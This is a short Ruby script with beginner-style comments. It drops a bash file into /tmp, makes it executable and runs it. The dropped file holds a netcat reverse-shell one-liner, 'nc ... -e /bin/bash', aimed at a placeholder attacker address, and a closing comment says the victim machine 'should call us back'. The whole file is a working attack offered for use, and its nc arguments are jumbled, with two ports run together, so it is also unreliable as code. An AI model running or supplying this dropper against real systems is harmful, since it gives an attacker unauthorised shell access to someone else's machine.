#!/usr/bin/env ruby

file1 = File.new("/tmp/file1.sh", "w")		# this is creating a file in the '/tmp/' folder and naming it file1.sh
file1.chmod( 0755 )					# we are changing the file permissions
File.write("/tmp/file1.sh", "#!/bin/bash\nnc -nv <your ip addr><port of your choosing> 9001 -e /bin/bash")		# we are now writing to the file we created. this happens to be a one liner for a reverse_shell using bash
exec("bash /tmp/file1.sh")		# we are using command subsitution with 'exec' then inside the perands and quotes we give it the command we want to run. in this case we are telling it to execute file1 one using a bash shell.



# SUMMARY

# if net cat is present on the machine executing this code, it should call us back at 'your ip address' 
